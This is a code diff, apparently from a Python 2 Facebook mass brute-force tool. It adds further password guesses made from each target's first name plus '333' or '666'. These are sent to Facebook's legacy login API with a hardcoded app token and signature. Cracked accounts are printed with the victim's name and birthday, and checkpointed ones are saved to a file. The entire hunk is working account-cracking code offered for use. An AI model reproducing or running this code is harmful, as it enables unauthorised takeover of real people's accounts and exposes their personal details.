@@ -969,6 +969,42 @@ def pilih_mbf():
 																																			cek.write(user+"|"+pass16+"\n")
 																																			cek.close()
 																																			cp.append(user+pass16)
+																																		else:
+																																			pass17 = b['first_name'] + '333'
+																																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass17)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																																			q = json.load(data)
+																																			if 'access_token' in q:
+																																				print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
+																																				print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass17
+																																				print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
+																																				oks.append(user+pass17)
+																																			else:
+																																				if 'www.facebook.com' in q["error_msg"]:
+																																					print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
+																																					print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass17
+																																					print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
+																																					cek = open("out/mbf_cp.txt", "a")
+																																					cek.write(user+"|"+pass17+"\n")
+																																					cek.close()
+																																					cp.append(user+pass17)
+																																				else:
+																																					pass18 = b['first_name'] + '666'
+																																					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass18)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																																					q = json.load(data)
+																																					if 'access_token' in q:
+																																						print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
+																																						print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass18
+																																						print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
+																																						oks.append(user+pass18)
+																																					else:
+																																						if 'www.facebook.com' in q["error_msg"]:
+																																							print '\033[1;96m| \033[1;97mNM \033[1;96m|\033[1;31m '+b['name']
+																																							print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;34m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass18
+																																							print '\033[1;96m| \033[1;31mTL \033[1;96m|\033[1;93m '+b['birthday']
+																																							cek = open("out/mbf_cp.txt", "a")
+																																							cek.write(user+"|"+pass18+"\n")
+																																							cek.close()
+																																							cp.append(user+pass18)
 
 
 		except:
